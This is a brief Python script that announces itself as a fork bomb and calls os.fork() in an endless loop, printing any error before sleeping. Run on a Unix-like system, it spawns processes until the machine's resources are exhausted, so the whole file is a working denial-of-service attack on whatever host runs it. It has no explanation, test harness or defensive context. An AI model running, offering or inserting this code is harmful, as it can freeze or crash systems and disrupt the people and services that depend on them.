import os
import time

print("Starting fork bomb")
try:
    while True:
        os.fork()
except Exception as e:
    print(e)

time.sleep(10)
